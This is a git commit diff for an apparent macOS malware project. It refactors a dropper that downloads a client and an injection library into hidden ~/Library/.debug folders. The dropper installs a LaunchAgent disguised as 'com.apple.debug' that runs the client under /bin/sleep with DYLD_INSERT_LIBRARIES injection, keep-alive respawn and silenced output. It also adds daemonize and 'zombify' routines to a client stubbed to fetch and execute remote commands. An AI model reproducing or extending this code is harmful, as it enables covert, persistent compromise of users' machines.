2e4b77c2d4677ce57de0f016366226b9219761e9
Henry Pitcairn <735tesla@gmail.com>
2016-03-01 11:46:36 -0500

    refactor installer

--- dropper.sys/dropper.sys/main.c
+++ dropper.sys/dropper.sys/main.c
@@ -13,12 +13,19 @@
 #include <curl/curl.h>
 #include <CoreFoundation/CoreFoundation.h>
 
+#define INSTALL_PATH "Library/.debug/"
+#define BIN_PATH INSTALL_PATH ".bin/"
+#define RESOURCE_PATH INSTALL_PATH ".resources/"
+#define PLUGINS_PATH INSTALL_PATH ".plugins/"
+#define METASTASYS_EXECUTABLE BIN_PATH "debug-client"
+#define CHAMELION_LIB BIN_PATH "libchamelion.sys.dylib"
 #define LABEL "com.apple.debug"
-#define RELATIVE_PATH "Library/LaunchAgents/" LABEL ".plist"
-#define METASTASYS_EXECUTABLE "~/Library/.debug/debug-client"
-#define LOAD_COMMAND "/bin/launchctl load -w " RELATIVE_PATH
+#define PLIST_PATH "Library/LaunchAgents/" LABEL ".plist"
+#define LOAD_COMMAND "/bin/launchctl load -w " PLIST_PATH
 #define START_COMMAND "/bin/launchctl start " LABEL
-#define EXECUTABLE "http://127.0.0.1:8080/downloads/metast.sys"
+#define PARASITE_HOST "/bin/sleep"
+#define METASTASYS_DOWNLOAD "http://127.0.0.1:8080/downloads/metast.sys"
+#define CHAMELION_DOWNLOAD "http://127.0.0.1:8080/downloads/libchamelion.sys.dylib"
 #define METAST_DEBUG 1
 
 void silence_output(int fdIn, int fdOut);
@@ -30,8 +37,8 @@ void download_components(void);
 int main(int argc, const char * argv[]) {
     int fdIn, fdOut;
     if (!METAST_DEBUG) {
-        open("/dev/null", O_WRONLY);
-        open("/dev/null", O_RDONLY);
+        fdOut = open("/dev/null", O_WRONLY);
+        fdIn = open("/dev/null", O_RDONLY);
         silence_output(fdIn, fdOut);
     }
     chdir(getenv("HOME"));
@@ -53,10 +60,10 @@ void silence_output(int fdIn, int fdOut) {
 }
 
 void create_folder_tree(void) {
-    mkdir("Library/.debug", 0777);
-    mkdir("Library/.debug/.bin", 0777);
-    mkdir("Library/.debug/.plugins", 0777);
-    mkdir("Library/.debug/.resources", 0777);
+    mkdir(INSTALL_PATH, 0777);
+    mkdir(BIN_PATH, 0777);
+    mkdir(RESOURCE_PATH, 0777);
+    mkdir(PLUGINS_PATH, 0777);
 }
 
 ssize_t write_callback(void *buf, size_t buf_size, size_t nents, FILE *outfd) {
@@ -67,23 +74,29 @@ void download_components(void) {
     CURL *curl;
     FILE *fp;
     if ((curl = curl_easy_init())) {
-        if ((fp = fopen("Library/.debug/.bin/debug", "wb"))) {
-            curl_easy_setopt(curl, CURLOPT_URL, EXECUTABLE);
-            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
+        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
+        curl_easy_setopt(curl, CURLOPT_VERBOSE, METAST_DEBUG);
+        if ((fp = fopen(METASTASYS_EXECUTABLE, "wb"))) {
             curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);
-            curl_easy_setopt(curl, CURLOPT_VERBOSE, METAST_DEBUG);
+            curl_easy_setopt(curl, CURLOPT_URL, METASTASYS_DOWNLOAD);
             curl_easy_perform(curl);
-            curl_easy_cleanup(curl);
             fclose(fp);
-        } else {
-            curl_easy_cleanup(curl);
+            chmod(METASTASYS_EXECUTABLE, 0777);
         }
+        if ((fp = fopen(CHAMELION_LIB, "wb"))) {
+            curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);
+            curl_easy_setopt(curl, CURLOPT_URL, CHAMELION_DOWNLOAD);
+            curl_easy_perform(curl);
+            fclose(fp);
+            chmod(CHAMELION_LIB, 0777);
+        }
+        curl_easy_cleanup(curl);
     }
 }
 
-char *get_output_path(void) {
+char *get_plist_path(void) {
     char *home = getenv("HOME");
-    size_t output_dir_size = strlen(RELATIVE_PATH) + strlen(home) + 2;
+    size_t output_dir_size = strlen(home) + strlen(PLIST_PATH) + 2;
     char *output = NULL;
     if ((output = malloc(output_dir_size)) == NULL) {
         exit(EXIT_FAILURE);
@@ -91,28 +104,55 @@ char *get_output_path(void) {
     memset(output, '\0', output_dir_size);
     strlcpy(output, home, output_dir_size);
     strlcat(output, "/", output_dir_size);
-    strlcat(output, RELATIVE_PATH, output_dir_size);
+    strlcat(output, PLIST_PATH, output_dir_size);
     return output;
 }
 
+char *convert_bin_path(const char *bin) {
+    char *bin_path = "/Library/.debug/.bin/";
+    char *home = getenv("HOME");
+    char *out = NULL;
+    size_t out_size = strlen(home) + strlen(bin_path) + strlen(bin) + 1;
+    if ((out = malloc(out_size)) == NULL) {
+        return NULL;
+    }
+    strlcpy(out, home, out_size);
+    strlcat(out, bin_path, out_size);
+    strlcat(out, bin, out_size);
+    return out;
+}
+
 void create_launch_plist(void) {
-    char *output = get_output_path();
+    char *output = get_plist_path();
     CFStringRef output_string = CFStringCreateWithCString(kCFAllocatorDefault, output, kCFStringEncodingASCII);
     CFURLRef output_url = CFURLCreateWithFileSystemPath(kCFAllocatorDefault, output_string, kCFURLPOSIXPathStyle, false);
     CFRelease(output_string);
     free(output);
-    CFStringRef arguments[2];
-    arguments[0] = CFSTR(METASTASYS_EXECUTABLE);
-    arguments[1] = CFSTR("--zombie");
-    CFArrayRef arguments_array = CFArrayCreate(kCFAllocatorDefault, (const void **)arguments, 2, &kCFTypeArrayCallBacks);
-    
+    CFStringRef arguments[3];
+    arguments[0] = CFSTR(PARASITE_HOST);
+    char *metastasys_executable = convert_bin_path("debug-client");
+    CFStringRef metastasys_executable_str = CFStringCreateWithCString(kCFAllocatorDefault, metastasys_executable, kCFStringEncodingASCII);
+    free(metastasys_executable);
+    arguments[1] = metastasys_executable_str;
+    arguments[2] = CFSTR("--zombie");
+    CFArrayRef arguments_array = CFArrayCreate(kCFAllocatorDefault, (const void **)arguments, 3, &kCFTypeArrayCallBacks);
+    CFMutableDictionaryRef mutable_env_dict = CFDictionaryCreateMutable(kCFAllocatorDefault, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    char *chamelion_lib = convert_bin_path("libchamelion.sys.dylib");
+    CFStringRef chamelion_lib_str = CFStringCreateWithCString(kCFAllocatorDefault, chamelion_lib, kCFStringEncodingASCII);
+    CFDictionarySetValue(mutable_env_dict, CFSTR("DYLD_INSERT_LIBRARIES"), chamelion_lib_str);
+    free(chamelion_lib);
+    CFRelease(chamelion_lib_str);
+    CFDictionaryRef immutable_env_dict = CFDictionaryCreateCopy(kCFAllocatorDefault, mutable_env_dict);
     CFMutableDictionaryRef dict = CFDictionaryCreateMutable(kCFAllocatorDefault, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
-    
     CFDictionarySetValue(dict, CFSTR("Label"), CFSTR(LABEL));
     CFDictionarySetValue(dict, CFSTR("KeepAlive"), kCFBooleanTrue);
     CFDictionarySetValue(dict, CFSTR("EnableGlobbing"), kCFBooleanTrue);
     CFDictionarySetValue(dict, CFSTR("ProgramArguments"), arguments_array);
+    CFRelease(metastasys_executable_str);
     CFRelease(arguments_array);
+    CFDictionarySetValue(dict, CFSTR("EnvironmentVariables"), immutable_env_dict);
+    CFRelease(mutable_env_dict);
+    CFRelease(immutable_env_dict);
     CFDictionarySetValue(dict, CFSTR("StandardOutPath"), CFSTR("/dev/null"));
     CFDictionarySetValue(dict, CFSTR("StandardErrorPath"), CFSTR("/dev/null"));
     int respawn = 300;
--- metast.sys/metast.sys/main.m
+++ metast.sys/metast.sys/main.m
@@ -8,21 +8,67 @@
 
 #import <Foundation/Foundation.h>
 #include <unistd.h>
+#include <sys/stat.h>
 #import "MSAPI.h"
+
+#define HOME_DIR "Library/.debug"
+#define LOG_OUT ".resources/metastasys.log"
+#define PARASITE_HOST "/usr/sbin/usernoted"
+
+void daemonize(void);
+void zombify(void);
+
+static int outFd = 0;
 
 int main(int argc, const char * argv[]) {
     @autoreleasepool {
-        NSLog(@"%@", [[NSUUID UUID] UUIDString]);
-        pid_t pid = fork();
-        if (pid > 0) {
-            exit(EXIT_FAILURE);
-        } else if (pid < 0) {
-            exit(EXIT_FAILURE);
+        if (argc > 1) {
+            if (strcmp(argv[1], "--daemon") == 0) {
+                daemonize();
+            } else if (strcmp(argv[1], "--zombie") == 0) {
+                zombify();
+            }
         }
-        
+        NSLog(@"%@", [[NSUUID UUID] UUIDString]);
         while (YES) {
             // Get command from API, execute, send reponse
+            NSLog(@"%s", *argv);
+            sleep(1);
         }
     }
     return 0;
+}
+
+void set_outputs(void) {
+    chdir(getenv("HOME"));
+    chdir(HOME_DIR);
+    close(STDIN_FILENO);
+    outFd = open(LOG_OUT, O_WRONLY);
+    dup2(outFd, STDOUT_FILENO);
+    dup2(outFd, STDERR_FILENO);
+}
+
+void daemonize(void) {
+    pid_t pid, sid = 0;
+    pid = fork();
+    if (pid < 0) {
+        exit(EXIT_FAILURE);
+    } else if (pid > 0) {
+        exit(EXIT_SUCCESS);
+    }
+    umask(0);
+    sid = setsid();
+    if (sid < 0) {
+        exit(EXIT_FAILURE);
+    }
+    setpgrp();
+    set_outputs();
+}
+
+void zombify(void) {
+    pid_t pid = fork();
+    if (pid > 0 || pid < 0) {
+        exit(EXIT_FAILURE);
+    }
+    set_outputs();
 }
